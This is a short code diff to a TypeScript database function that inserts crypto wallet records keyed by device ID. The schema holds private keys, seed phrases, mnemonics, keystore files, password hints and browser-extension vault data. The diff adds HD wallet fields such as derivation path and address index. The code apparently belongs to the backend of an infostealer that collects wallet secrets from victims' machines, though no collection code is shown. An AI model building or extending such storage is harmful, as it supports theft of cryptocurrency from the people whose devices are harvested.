@@ -146,6 +146,11 @@ export async function insertCryptoWallets(
     wallet.network_config ? JSON.stringify(wallet.network_config) : null,
     wallet.vault_data ? (typeof wallet.vault_data === 'string' ? wallet.vault_data : JSON.stringify(wallet.vault_data)) : null,
     wallet.extension_id || null,
+    // HD Wallet fields
+    wallet.derivation_path || null,
+    wallet.seed_id || null,
+    wallet.address_index || null,
+    wallet.wallet_software || null,
   ])
 
   const query = `
@@ -153,12 +158,13 @@ export async function insertCryptoWallets(
       device_id, wallet_type, wallet_name, address, private_key,
       seed_phrase, mnemonic, keystore_file, password_hint,
       file_path, blockchain, public_key, account_name, network_config,
-      vault_data, extension_id
+      vault_data, extension_id, derivation_path, seed_id, address_index,
+      wallet_software
     ) VALUES ?
   `
 
   await executeQuery(query, [values])
-  console.log(`✅ Inserted ${wallets.length} crypto wallet(s) with enhanced fields`)
+  console.log(`✅ Inserted ${wallets.length} crypto wallet(s) with enhanced fields and HD wallet analysis`)
   return wallets.length
 }
 
